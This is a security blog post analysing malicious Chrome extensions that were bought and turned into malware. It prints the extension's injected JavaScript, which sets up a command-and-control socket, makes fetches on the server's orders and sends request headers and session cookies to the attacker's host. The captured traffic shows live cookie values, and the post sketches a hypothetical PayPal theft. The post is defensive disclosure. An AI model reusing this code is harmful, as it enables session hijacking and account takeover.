---
layout: post
title: "Browser Extensions: The Next Generation of Malware"
permalink: /2020/extensions-the-next-generation-of-malware/
description: "With nearly unlimited access to your browser - therefore any account you have on the web - extensions represent an increasingly valuable frontier for malware authors. Alongside little store regulation, push updates to all users, and hard-to-detect command and control options, 200k infected systems in a day is all-too-easy."
date: 2020-10-20 00:00:00
tags:
- malware
- extension
- chrome
---

On October 6th, 2020, a keen-eyed Redditor by the name of [ufo56](https://www.reddit.com/user/ufo56/) spotted unexplainable activity on their Facebook and Instagram accounts after installing a new extension called "User-Agent Switcher" on their Chrome browser. Setting up [Fiddler](https://www.telerik.com/fiddler), they immediately observed concerning traffic, took some screenshots, reported the issue to Google, and posted a [warning](https://www.reddit.com/r/cybersecurity/comments/j6gg2q/chrome_extension_with_100k_installs_makes_your/) on the cybersecurity subreddit:

**Chrome extension with 100k+ installs makes your Chrome browser like random people's Facebook/Instagram pictures.**

>After install I instantly noticed some strange activity on Facebook and Instagram. I analyzed chrome traffic with Fiddler and found out that extension connects to useragentswitch.com/socket.io/xxxxx and starts liking pictures.

Interested, I started digging into the extension to find out more. I fully expected this to be a one-evening project, and initially suspected that the massive install base had simply been [fraudulent](https://www.theregister.com/2020/05/28/chrome_web_store_fraud/) to bait users into trusting the extension. But the more I dug, the more complex and concerning the story became. Now two weeks deep in my investigation, I can now confirm that this was not an isolated incident but the evolution of an active and modern campaign, in which extensions with hundreds of thousands of users are bought by an unknown party and then infected with malware.

Unfortunately, the malware author didn't stop at 100k infections. Shortly after malicious code was added to the User-Agent Switcher extension, it seems the same unknown party purchased the long-standing Nano Adblocker and Nano Defender extensions from their maintainer, Hugo Xu. Extremely similar malicious code was added two weeks later, infecting *another 250k* users as their extension auto-updated.

This article will be a technical deep dive on how this particular breed of malware operates: including the history of the infected extensions, what this malware does, how it works under the hood, and what it can do to unsuspecting users. Lastly, we'll discuss important takeaways for users, extension authors, security teams, and even Google itself.

## Timeline

- **January 30th, 2016** (or prior): The User-Agent Switcher extension is [released](/2020/extensions-the-next-generation-of-malware/esolutions-fb-history.png) by eSolutions Nordic. This extension accumulates ~100k active users and ~140 ratings (very positive) by mid 2020.
- **September 27th, 2017** (or prior): Hugo Xu releases uBlock Protector, which is an anti-anti-adblock extension augmenting uBlock. This is eventually renamed Nano Defender and is expanded to protect both extensions from anti-adblock countermeasures. This extension [accumulates](https://chrome-stats.com/d/ggolfgbegefeeoocgjbmkembbncoadlb) 260k users and 309 ratings (extremely positive) by mid 2020.
- **January 7th, 2018** (or prior): Hugo Xu releases Nano Adblocker, a lean fork of uBlock Origin, which [accumulates](https://chrome-stats.com/d/gabbbocakeomblphkmmnoamkioajlkfo) 182k users and 255 ratings (extremely positive) by mid 2020.
- **May 28th, 2020**: User-Agent Switcher is updated to version 2.0.0.8 - this is a minor update and contains nothing suspicious.
- **July 3rd, 2020** (or prior): eSolutions Nordic [changes](/2020/extensions-the-next-generation-of-malware/esolutions-fb-history.png) the links to "their" extension, indicating the first was [sold](/2020/extensions-the-next-generation-of-malware/esolutions-fb-sale.png). This is confirmed by the link changing on their website between [May 12](https://web.archive.org/web/20200512050157/https://www.esolutions.se/) and [August 6](https://web.archive.org/web/20200806004521/https://www.esolutions.se/), though no finer-grained data is available. The new copy of their extension is uploaded to the Chrome Web Store.
- **August 29th, 2020**: User-Agent Switcher is updated to version 2.0.0.9 - this update introduces Socket.IO as well as a basic C&C structure for forced browsing, but does not steal request headers for any sites. ~100k users are infected by this action.
- **September 7th, 2020**: User-Agent Switcher is updated to version 2.0.1.0 - this is the update analyzed in this post, which was expanded from the previous version to steal request headers for certain sites.
- Prior to **October 3rd, 2020**: One or more developers claiming to be in Turkey [begin talks](https://github.com/NanoAdblocker/NanoCore/issues/362) with Hugo Xu to acquire Nano Adblocker and Nano Defender. They identify themselves as "new developers" and remain anonymous. This is a generally unpopular move, and some (lead by gorhill) voice concerns about the acquiring party.
- **October 3rd-6th, 2020**: Users begin to publicly report that User Agent Switcher has been performing malicious actions, both in [reviews](/2020/extensions-the-next-generation-of-malware/comments-warning.png) and on [Reddit](https://www.reddit.com/r/cybersecurity/comments/j6gg2q/chrome_extension_with_100k_installs_makes_your/).
- **October 5th, 2020**: The sale of Nano Adblocker and Nano Defender completes, and Hugo Xu transfers control of the Chrome extensions.
- **October 15th, 2020**: Google removes User-Agent Switcher from the Chrome Web Store, twelve days after reports are known to begin. The new owners of Nano Adblocker and Nano Defender upload their first update - it is functionally identical to the malware in User-Agent Switcher, with some additional bells & whistles including a `report` event which appears to fire if the user has Dev Tools open. ~250k users are infected by this action, for an assumed total of roughly ~350k infections in two months. Already suspicious of the transferred power, LiCybora, uBlock-user, and gorhill quickly identify the added code is [malicious](https://github.com/NanoAdblocker/NanoCore/issues/362#issuecomment-709428210).
- **October 16th, 2020** - Google removes both Nano Adblocker and Nano Defender from the Chrome Web Store, one day after the infection.

## Observation

Spinning up resources to test the User-Agent Switcher extension and monitor its traffic was simple. Since I didn't have an Instagram account tied to my phone, I signed up for one that I could comfortably destroy. While this extension is reported to also abuse Facebook accounts, I'm unwilling to buy one for testing (as they're often compromised), and while I've been looking to delete my Facebook this isn't quite the "bang" I want to go out with.

Once I set up an account, created a VM on an isolated network, installed Chrome and [Burp Suite](https://portswigger.net/burp), configured both, and logged in - we're ready to see what happens. Installing the extension and restarting my browser for good measure, the results started rolling in quickly.

#### Initial Contact & Socket.IO

Immediately after browser startup, a number of connections are rapidly made over HTTPS to the domain specified as the extension's author, `https://www.useragentswitch.com`:

```
Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1TZnJ
Response: 96:0{"sid":"MZhr5sp7_Ws-V9R_Afs8","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}2:40

Requested URL: /socket.io/?EIO=3&transport=websocket&sid=MZhr5sp7_Ws-V9R_Afs8
Response: 

Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1Ta5m&sid=MZhr5sp7_Ws-V9R_Afs8
Response: 65:42["handlerData",{"type":"xmlhttprequest","url":"instagram.com"}]

Requested URL: /socket.io/?EIO=3&transport=polling&t=NK1Ta9O&sid=MZhr5sp7_Ws-V9R_Afs8
Response: 1:6
```

Dropping the only most recognizable string into google - `socket.io` - we quickly learn this malware is establishing a WebSocket using [Socket.IO](https://socket.io), a popular engine for establishing and managing bidirectional WebSockets. The [internals](https://socket.io/docs/internals/) and [protocol](https://github.com/socketio/engine.io-protocol) documentation partially explained the initialization sequence we just witnessed:

- The first response contains instructions for the client to change transport protocols to using a WebSocket, and includes a Session ID as well as frequency parameters for pinging and timeout (25 seconds and 5 seconds, respectively).
- The third response is a message not present in the documentation, and certainly suspicious since this isn't an Instagram-centric socket handler. We'll come back to this later.
- ... and the fourth response is simply a [noop](https://en.wikipedia.org/wiki/NOP_(code)).

Switching over to the WebSockets tab, a few messages had been exchanged which confirm the upgrade to the new transport layer:

```
Client -> Server:
2probe
Server -> Client:
3probe
Client -> Server:
5
```

Then the only communication for a few minutes is  "pings" and "pongs" to ensure the socket is and remains alive:

```
Client -> Server:
2
Server -> Client:
3
```

#### Malicious Operations on Facebook

Two minutes and ten seconds of heartbeats later, the server sends a longer message over the WebSocket:

```
Server -> Client
42["createFetch",{"callBack":"initCallBackFB","uri":"https://www.facebook.com/","attr":
{"credentials":"include","headers":{"accept":"text/html,application/xhtml+xml,application/
xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"origin-zzz":"https://www.facebook.com","sec-fetch-dest":"document",
"sec-fetch-mode":"navigate","se-zzzc-fetch-site":"same-origin","se-zzzc-fetch-user":"?1",
"upgrade-insecure-requests":"1"},"referrerPolicy":"no-referrer-when-downgrade","body":null,
"method":"GET","mode":"cors"}}]
```

Looking at the Socket.IO docs, a message type of 42 is read as "engine: 4, socket: 2" and is referenced as MESSAGE_EVENT - so it seems that our malicious extension is being told to perform an action (a `createFetch` event, whatever that means). Though it didn't take much wondering, as my browser sprang to life and made a request to Facebook:

```
Host: www.facebook.com
Connection: close
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
upgrade-insecure-requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sb=djl9XybrliHbaXtut9kQZ5f-; fr=105lau0rVCvNUPaQy.AWVtW4Eyu8OUoPBfn0On9TJgvQM.BffTl2.0k.AAA.0.0.BffT6F.AWUj8rhsvQE
origin: https://www.facebook.com
sec-fetch-user: ?1
```

What's important to note here is that the headers are set to innocuous values. While the initial requests to `www.useragentswitch.com` included an Origin header which included the Chrome extension ID, this request was "clean" and contained no such trace. Further, the odd `-zzz` strings sent in the WebSocket event have disappeared - probably by some filtering and reconstruction locally.

After receiving a response from Facebook, my browser forwards the entire response back to the server as another MESSAGE_EVENT, this time with a key of `initCallBackFB` (which was specified in the `callBack` key of the original `createFetch` event). I've omitted the Content Security Policy and HTML from the response for brevity:

```
Client -> Server
42["initCallBackFB",{"headerEntries":[["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; 
ma=3600"],["cache-control","private, no-cache, no-store, must-revalidate"],["connection",
"close"],["content-security-policy","<FACEBOOK CSP OMITTED FOR BREVITY>"],["content-type",
"text/html; charset=\"utf-8\""],["date","Wed, 07 Oct 2020 05:11:02 GMT"],["expires","Sat, 01 
Jan 2000 00:00:00 GMT"],["pragma","no-cache"],["strict-transport-security","max-age=15552000; 
preload"],["vary","Accept-Encoding"],["x-content-type-options","nosniff"],["x-fb-debug",
"0e7D12VGda2oR5J84JmIore1H9pXLIstEI084Ex/MpeTOqgOaaEY7n7HU5L/YgcT0NVxFAfs0HT7B0gpXPfTJQ=="],
["x-frame-options","DENY"],["x-xss-protection","0"]],"data":"<HTML OMITTED FOR BREVITY>",
"ok":true,"status":200}]
```

In effect, the server is remotely controlling my browser, and reading the responses that it gets. Had I been logged in, an attacker would have been reading off my friends' and family's activity feed. While that's a gross violation of privacy, at least my account wasn't compromised, since the response data doesn't include my session token.

The server does not send more requests for Facebook after this point, so it seems that the serverside logic is fairly complex, and uses the response data to check if a user is logged in before attempting to continue using their account. Confirming with ufo56 in direct messages, had I been logged in, my account would probably have been used to promote influencer content:

> I first discovered it [because it accessed my] Facebook, but there was maybe 2-3 likes/day ...

#### Malicious Operations on Instagram

One minute and two seconds later, the server sends a new `createFetch` event, instructing my browser to load Instagram:

```
Server -> Client
42["createFetch",{"callBack":"initCallBack","uri":"https://www.instagram.com/","attr":
{"credentials":"include","headers":{"origin-zzz":"https://www.instagram.com",
"sec-fetch-dest":"document","sec-fetch-mode":"navigate","se-zzzc-fetch-site":"none",
"upgrade-insecure-requests":"1"},"referrerPolicy":"no-referrer-when-downgrade","body":null,
"method":"GET","mode":"cors"}}]
```

Now, our malware author gets lucky - I'm logged in to my dummy account. A request to Instagram is made, but to my surprise, two separate events are sent. One we expect, which is the callback containing the response data - identical to what we saw for Facebook, except this event is titled `initCallBack` instead of `initCallBackFB`:

```
Client -> Server
42["initCallBack",{"headerEntries":[["access-control-allow-credentials","true"],
["access-control-allow-origin","https://www.instagram.com"],["access-control-expose-headers",
"X-IG-Set-WWW-Claim"],["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; ma=3600"],
["cache-control","private, no-cache, no-store, must-revalidate"],["connection","close"],
["content-language","en"],["content-length","47356"],["content-security-policy","<INSTAGRAM 
CSP OMITTED FOR BREVITY>"],["content-type","text/html; charset=utf-8"],["date","Wed, 07 Oct 
2020 05:12:04 GMT"],["expires","Sat, 01 Jan 2000 00:00:00 GMT"],["pragma","no-cache"],
["strict-transport-security","max-age=31536000"],["vary","Accept-Language, Cookie, 
Accept-Encoding"],["x-accel-buffering","no"],["x-aed","20"],["x-content-type-options",
"nosniff"],["x-fb-trip-id","1679558926"],["x-frame-options","SAMEORIGIN"],["x-xss-protection",
"0"]],"data":"<HTML OMITTED FOR BREVITY>","ok":true,"status":200}]
```

The other is a surprise. My request headers, *including my session cookie*, are also stolen. The malware author could now hijack my current session with Instagram and browse as me from wherever they are in the world. While they could technically do something equivalent with some clever programming and a lot of `createFetch` events, this makes it even more trivial.

Notably, the `requestHeadersHandler` event wasn't specified in the `createFetch` event that was sent to my browser, so I'll need to hunt down why this event was triggered when looking at the malicious extension's internals:

```
Client -> Server
42["requestHeadersHandler",{"frameId":0,"initiator":"chrome-extension://
clddifkhlkcojbojppdojfeeikdkgiae","method":"GET","parentFrameId":-1,"requestHeaders":[
{"name":"se-zzzc-fetch-site","value":"none"},{"name":"origin-zzz","value":"https://www.
instagram.com"},{"name":"upgrade-insecure-requests","value":"1"},{"name":"User-Agent",
"value":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.
4240.75 Safari/537.36"},{"name":"Accept","value":"*/*"},{"name":"Sec-Fetch-Site",
"value":"none"},{"name":"Sec-Fetch-Mode","value":"cors"},{"name":"Sec-Fetch-Dest",
"value":"empty"},{"name":"Accept-Encoding","value":"gzip, deflate, br"},
{"name":"Accept-Language","value":"en-US,en;q=0.9"},{"name":"Cookie",
"value":"ig_did=0BD6DADB-8BE2-4CAC-8AD2-7C276D9054B6; mid=X305GAAEAAHAOaH2mauPtYA6R8pf; 
ig_nrcb=1; csrftoken=zepUGi0jiUJB7GfTBQ4cC2F1ZYn7J6W5; ds_user_id=43092726024; 
sessionid=43092726024%3AfQVgHKyfgJh3O7%3A19"}],"requestId":"65","tabId":-1,
"timeStamp":1602047524229.481,"type":"xmlhttprequest","url":"https://www.instagram.com/"}]
```

The next steps should not be much of a surprise, but the server appears to analyze the request to see if there's an active login, and then proceeds with its ultimate goal: User-Agent Switcher finally starts generating revenue by promoting content, most likely for customers paying the malware author. First, a specific post from a seemingly-paying customer (one @bebe_quiche) is loaded with another `createFetch` event:

```
Server -> Client
42["createFetch",{"callBack":"getPostParamsHandler","uri":"https://www.instagram.com/p/
CFkWDmNpFfN/","attr":{"headers":{"sec-fetch-dest":"document","sec-fetch-mode":"navigate",
"se-zzzc-fetch-site":"same-origin","sec-fetch-user":"?1","upgrade-insecure-requests":"1"},
"referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors",
"credentials":"include"}}]
```

After sending the header of the request that my browser made as a `requestHeadersHandler` event, alongside the response (this time called a `getPostParamsHandler` event), the server finds the Like link in the post, and directs my browser to promote @bebe_quiche's post:

```
Server -> Client
42["createFetch",{"callBack":"sendLikeHandler","uri":"https://www.instagram.com/web/likes/
2406145105135425485/like/","attr":{"credentials":"include","method":"POST","mode":"cors",
"headers":{"accept":"*/*","sec-fetch-dest":"empty","sec-fetch-mode":"cors",
"se-zzzc-fetch-site":"same-origin","Referer-zzz":"https://www.instagram.com/p/CFkWDmNpFfN/",
"Origin-zzz":"https://www.instagram.com","content-type":"application/x-www-form-urlencoded",
"x-ig-app-id":"936619743392459","x-csrftoken":"zepUGi0jiUJB7GfTBQ4cC2F1ZYn7J6W5",
"x-instagram-ajax":"38f51516507c","x-ig-www-claim":0,"x-requested-with":"XMLHttpRequest"},
"body":""}}]
```

Which it does successfully, *again* reporting the request headers with `requestHeadersHandler`, alongside a new `sendLikeHandler` event:

```
Client -> Server
42["sendLikeHandler",{"headerEntries":[["access-control-allow-credentials","true"],
["access-control-allow-origin","https://www.instagram.com"],["access-control-expose-headers",
"X-IG-Set-WWW-Claim"],["alt-svc","h3-29=\":443\"; ma=3600,h3-27=\":443\"; ma=3600"],
["cache-control","private, no-cache, no-store, must-revalidate"],["connection","close"],
["content-language","en"],["content-length","16"],["content-security-policy","<INSTAGRAM 
CSP OMITTED FOR BREVITY>"],["content-type","application/json; charset=utf-8"],["date","Wed, 
07 Oct 2020 05:12:07 GMT"],["expires","Sat, 01 Jan 2000 00:00:00 GMT"],["pragma","no-cache"],
["strict-transport-security","max-age=31536000"],["vary","Accept-Language, Cookie"],["x-aed",
"20"],["x-content-type-options","nosniff"],["x-fb-trip-id","1679558926"],["x-frame-options",
"SAMEORIGIN"],["x-ig-set-www-claim","hmac.AR2Ugv6Y86E7AjJ-5QIdNOX8A6Re0l5aSQ7Gmv3ykyMMCsxn"],
["x-robots-tag","noindex"],["x-xss-protection","0"]],"data":"{\"status\": \"ok\"}","ok":true,
"status":200}]
```

After this, the server continues sending `createFetch` events for loading Instagram posts and liking them, and no new event types or interactions were observed. For your exploration, I have also included a brief [traffic log](/2020/extensions-the-next-generation-of-malware/traffic.xml) exported from Burp with initial WebSocket setup as well as the requests and responses generated by these events (minus HTML data, as it only added bloat - not context).

## Dissection

Hopping into the extension directory, we're greeted with simple internals - mostly JavaScript, some HTML, CSS, and little else. The extension's files are available [here](https://github.com/partridge-tech/chris-blog/tree/master/_content/2020/extensions-the-next-generation-of-malware/no-publish/) for your own exploration. The JavaScript files have been minified (a space-saving measure), so I "beautified" them with [js-beautify](https://github.com/beautify-web/js-beautify) before beginning - though only the originals have been uploaded.

To try to get an early lead, I searched `www.useragentswitch.com` to see if the C&C domain was hardcoded, on the off chance that the malicious components of this extension weren't [obfuscated](https://github.com/javascript-obfuscator/javascript-obfuscator). Surprisingly, it matched in `js/background.min.js`:

```js
            return chrome.tabs.create({
                url: "http://www.esolutions.se/whatsmyinfo"
            }), !1
        },
        title: "Show User-agent",
        type: "normal"
    })
}
var userAgentSwitch = io("https://www.useragentswitch.com/");

function setUserAgent(e, t, s, n) {
    for (var r, a = 0; a < userAgents.length; a)
```

Even better, we got another lead only a few lines away. What is `esolutions.se/whatsmyinfo`? A quick Google search shows that [eSolutions Nordic AB](https://www.esolutions.se/) is a small development company - one which also dabbles in building useful Chrome extensions, such as... [User-Agent Switcher](https://chrome.google.com/webstore/detail/user-agent-switcher/aedikcfpfonanffanecfolneiaoakmlc)!

![Chrome Web Store's User-Agent Switcher extension page (nonmalicious).](/2020/extensions-the-next-generation-of-malware/store-uas-clean-small.png)

At this point I though that our malware authors picked a common tactic: downloading an existing extension, inserting malware, uploading their malicious copy to the Chrome Web Store, and then use various tactics (discussed in the [Chrome Web Store](#chrome-web-store) subsection of Background) to manipulate users into trusting it as "safe." However, we'll find some evidence later which contradicts this.

Fortunately for us, this gives us a really powerful method to trim down the code we'll need to look through. Unpacking the clean User-Agent Switcher extension (including beautifying its JavaScript), aligning the file structure (to account for the different version folder), and [diffing](https://linux.die.net/man/1/diff) the two extension folders, only a few files are different: `js/background.min.js`, `js/bootstrap.min.js`, `js/JsonValues.min.js`, `manifest.json`, `_metadata/computed_hashes.json`, and `_metadata/verified_contents.json`. Eliminating irrelevant files (metadata and contents), as well as `js/bootstrap.min.js` which contains different *comments* but not different *code*, we're left with only two files to go through: `js/JsonValues.min.js` and `js/background.min.js`, whose diff with their nonmalicious counterparts is [here](/2020/extensions-the-next-generation-of-malware/unpacked-contents.diff).

#### js/JsonValues.min.js

Taking a look at `js/JsonValues.min.js`, this file had several thousand lines of code appended to it. Pruning through, they're large, socket-oriented functions - so there's a good chance the added content is just the Socket.IO client. I wasn't certain that was the *only* content added to this file, so I ran it through [JS NICE](http://www.jsnice.org/) - a project which attempt to intelligently reassemble obfuscated or minified JavaScript by [SRI Lab](http://www.sri.inf.ethz.ch/) at [ETH ZÃ¼rich](http://www.ethz.ch/) - to see if anything caught my eye after it was automatically annotated. Nothing did, so I took a couple notes and moved on.

#### js/background.min.js

It is quickly apparent that `js/background.min.js` contains most if not all of User-Agent Switcher's malicious components, especially since we already know that the `www.useragentswitch.com` domain is contained within it. Removing the noise from the version and minification differences between the extensions we're comparing, the malicious content the author added is only ~30 lines long. While simple, it gives the author more than enough control over a user's browser to perform malicious actions.

## Functionality

The way this malware works is fairly simple, since Socket.IO's client-side WebSockets library handles the complexities of making, managing, and interacting with WebSockets. However, since it is principally event- and hook-driven, it may be hard to interpret for observers who aren't familiar with JavaScript. We'll go through the malicious code in sections before bringing it all together.

#### Initializing

Chrome loads `background.html` on browser start, which in turn loads `js/background.min.js` and `js/JsonValues.min.js`. The first thing User-Agent Switcher's malicious component does is initialize a WebSocket to its Command & Control server, which is a one-liner thanks to Socket.IO:

```js
var userAgentSwitch = io("https://www.useragentswitch.com/");
```

#### Fraudulent Request Handling

It also registers two event hooks on the socket that was just created. The first processes incoming `createFetch` events, which detail fraudulent requests that your browser is being used to execute. These events are passed directly to an asynchronous `createFetch` function, which fetches the requested content, then the results are passed as events which it sends to the Command and Control server via `emit()`.

```js
userAgentSwitch.on("createFetch", async function(e) {
    let t = await createFetch(e);
    userAgentSwitch.emit(e.callBack, t)
});

async function createFetch(e) {
    let t = await fetch(e.uri, e.attr),
        s = {};
    return s.headerEntries = Array.from(t.headers.entries()), s.data = await t.text(), s.ok = t.ok, s.status = t.status, s
}
```

#### Capturing the Request & Overwriting the Origin

The second event hook that is added to the socket is to process `handlerData` events, which list hosts that User-Agent Switcher would like to intercept headers on outgoing requests for - capturing session cookies, User-Agent strings, and more. Did you remember? This was actually the first malicious event we received from the server in the [Initial Contact & Socket.IO](#initial-contact--socketio) section, though it didn't do anything immediately, it was eventually the reason that headers were stolen for Instagram but not Facebook:

```
["handlerData",{"type":"xmlhttprequest","url":"instagram.com"}]
```

User-Agent Switcher also registers a function titled `handler2` which is invoked on all outgoing web requests before the headers are sent, doing two important functions:
- Checking to see if the domain that a request is being made for is in our local `handlerData` object, and if so, sending an event via `emit()` to the Command and Control server with the headers of the request.
- Removing any "obfuscating" `-zzz` strings in header parameters from `createFetch` events, and reconstructing the headers afterwards. This has a side (or perhaps main) benefit of overwriting the headers that Chrome had automatically built for the request, quietly erasing the `Origin` header (see notes from the [Malicious Operations on Facebook](#malicious-operations-on-facebook) subsection) which would have shown that this request came from an extension.

```js
var handlerData = {};
userAgentSwitch.on("handlerData", function(e) {
    handlerData = e
});

var handler2 = function(e) {
    var t = Object.keys(handlerData);
    if (t.length > 0) {
        var s = !0;
        for (let n = 0; n < t.length; n++) {
            let r = t[n];
            if (re = new RegExp(handlerData[r], "gi"), null == e[r].toString().match(re)) {
                s = !1;
                break
            }
        }
        s && userAgentSwitch.emit("requestHeadersHandler", e)
    }
    return {
        requestHeaders: JSON.parse(JSON.stringify(e.requestHeaders.reverse()).split("-zzz").join(""))
    }
};
chrome.webRequest.onBeforeSendHeaders.addListener(handler2, {
    urls: ["<all_urls>"]
}, ["requestHeaders", "blocking", "extraHeaders"]), runAppStart(), setIconAndText();
```

#### Data Flow

And that's it - the rest of the client-side C&C is 100% handled by Socket.IO and not inherently malicious - including:
- Establishing a WebSocket connection
- Reconnecting the WebSocket connection in case of a failure
- Packaging events and data into a custom protocol
- Responding to and sending heartbeats to keep the WebSocket alive

If you're curious or want to learn more about how Socket.IO works, check out their [documentation](https://socket.io/docs/). Putting Socket.IO's protocol together with the malicious code we explored, the control data flow can be mapped out as:

![User-Agent Switcher Command and Control schema.](/2020/extensions-the-next-generation-of-malware/cnc-logic.png)

#### Flexibility

The most important takeaway is that this malware, while simple, can be instructed by the malware author to perform nefarious actions on any site. If the author wanted to expand into bigger and badder territory - such as stealing online banking credentials - they could launch that attack immediately, without even updating the client. Say the author decides to try stealing money from my PayPal account:

- Send a `handlerData` event with PayPal's domain (www.paypal.com)
- Send a `createFetch` event for PayPal's dashboard

At that point, the malware author now has my session token, and could choose between executing requests remotely or on their own infrastructure (as they also have my browser information). If they chose to execute remotely, they would simply need to send more `createFetch` events to collect context (ex. how much money is in my account) and then POST transfer requests to PayPal's API. The only protection I have is that *maybe* PayPal would ask me to reenter my password if the transfer account was large enough or the user is not known - which extensions running in the background (thankfully) wouldn't be able to bypass without your password.

However, it could be updated to have functionality which would bypass the need for your password. Modifying money transfer requests so they will be sent to an attacker-controlled account would be a trivial change, and is functionally similar to how `handler` (from the clean version of User-Agent Switcher) and `handler2` hook to outgoing requests for rewriting. Further, it's unlikely that this behavior would be detected by Google's automatic and manual review processes, since they haven't detected the techniques used by this malware - as long as the hook was written similarly and didn't directly reference PayPal, it would probably be approved without a second thought.

## Google Trust & Safety

Knowing more than enough about how this malware works and reporting it to parties which host or support it, has there been any action to remove it?

**As of Thursday, October 15, 2020: Finally, yes.**

Despite reaching the top of [r/cybersecurity](https://reddit.com/r/cybersecurity), getting some very bad reviews, and having a bunch of people (including me) report this extension to Google over the past week (ufo56's [post](https://www.reddit.com/r/cybersecurity/comments/j6gg2q/chrome_extension_with_100k_installs_makes_your/) was Tuesday, October 6th), it was available for download from the Chrome Web Store until the morning of Thursday the 15th.

Any unsuspecting user that has this extension installed is still having their social media accounts manipulated, and is at risk of becoming a victim to high-impact attacks on other web services they use - as they have been for *at least* one month (since the extension was updated on September 7th 2020, and possibly people have been at risk for much longer than that based on the oldest comments).

With the increased pressure from this writeup - and hopefully positive community response - I'm sure this malware will eventually be removed from the Chrome Web Store, which will automatically purge it from users who had installed it previously as well. However, that begs the question: if ufo56 didn't make a post on Reddit about this, or their post hadn't gained any traction, and they'd simply filed their report and moved on: how long would this malware remain on the Chrome Web Store? Would their one report have generated any action at all?

